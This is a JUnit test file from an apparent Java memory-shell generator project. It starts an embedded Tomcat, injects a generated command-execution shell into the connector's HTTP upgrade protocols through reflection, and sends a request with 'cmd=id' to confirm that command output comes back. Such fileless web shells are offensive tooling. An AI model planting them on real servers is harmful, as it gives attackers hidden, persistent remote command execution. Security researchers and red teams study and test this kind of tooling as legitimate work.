package com.reajason.javaweb.memshell.shelltool.command;

import com.reajason.javaweb.Server;
import com.reajason.javaweb.memshell.MemShellGenerator;
import com.reajason.javaweb.memshell.MemShellResult;
import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.ShellType;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.utils.ClassDefiner;
import org.apache.catalina.connector.Connector;
import org.apache.catalina.startup.Tomcat;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

class CommandUpgradeEmbeddedTomcatTest {
    @TempDir
    Path baseDir;

    private Tomcat tomcat;
    private Connector connector;

    @BeforeEach
    void startTomcat() throws Exception {
        Files.createDirectories(baseDir.resolve("webapp"));
        tomcat = new Tomcat();
        tomcat.setBaseDir(baseDir.resolve("tomcat").toString());
        tomcat.setPort(0);
        connector = tomcat.getConnector();
        tomcat.addWebapp("", baseDir.resolve("webapp").toString());
        tomcat.start();
    }

    @AfterEach
    void stopTomcat() throws Exception {
        if (tomcat != null) {
            tomcat.stop();
            tomcat.destroy();
        }
    }

    @Test
    void firstRequestOnColdProcessorReturnsCommandOutput() throws Exception {
        MemShellResult result = new MemShellGenerator().generate(
                ShellConfig.builder()
                        .server(Server.Tomcat)
                        .shellTool(ShellTool.Command)
                        .shellType(ShellType.UPGRADE)
                        .build(),
                InjectorConfig.builder().build(),
                CommandConfig.builder().paramName("cmd").build());
        registerUpgradeProtocol(result);

        String response = sendUpgradeRequest(result.getShellClassName());
        assertTrue(response.contains("uid="), "Upgrade connection closed without command output: " + response);
    }

    private String sendUpgradeRequest(String upgradeProtocol) throws Exception {
        try (Socket socket = new Socket("127.0.0.1", connector.getLocalPort())) {
            socket.setSoTimeout(5000);
            OutputStream output = socket.getOutputStream();
            output.write(("GET /test?cmd=id HTTP/1.1\r\n"
                    + "Host: 127.0.0.1\r\n"
                    + "Connection: Upgrade\r\n"
                    + "Upgrade: " + upgradeProtocol + "\r\n\r\n").getBytes(StandardCharsets.ISO_8859_1));
            output.flush();

            InputStream input = socket.getInputStream();
            ByteArrayOutputStream response = new ByteArrayOutputStream();
            byte[] buffer = new byte[4096];
            int count;
            while ((count = input.read(buffer)) != -1) {
                response.write(buffer, 0, count);
            }
            return response.toString(StandardCharsets.ISO_8859_1.name());
        }
    }

    @SuppressWarnings("unchecked")
    private void registerUpgradeProtocol(MemShellResult result) throws Exception {
        Object protocolHandler = connector.getProtocolHandler();
        Field field = null;
        Class<?> type = protocolHandler.getClass();
        while (type != Object.class && field == null) {
            try {
                field = type.getDeclaredField("httpUpgradeProtocols");
            } catch (NoSuchFieldException e) {
                type = type.getSuperclass();
            }
        }
        assertNotNull(field, "httpUpgradeProtocols not found");
        field.setAccessible(true);
        Map<String, Object> protocols = (Map<String, Object>) field.get(protocolHandler);
        protocols.put(result.getShellClassName(),
                ClassDefiner.defineClass(result.getShellBytes()).getDeclaredConstructor().newInstance());
    }
}
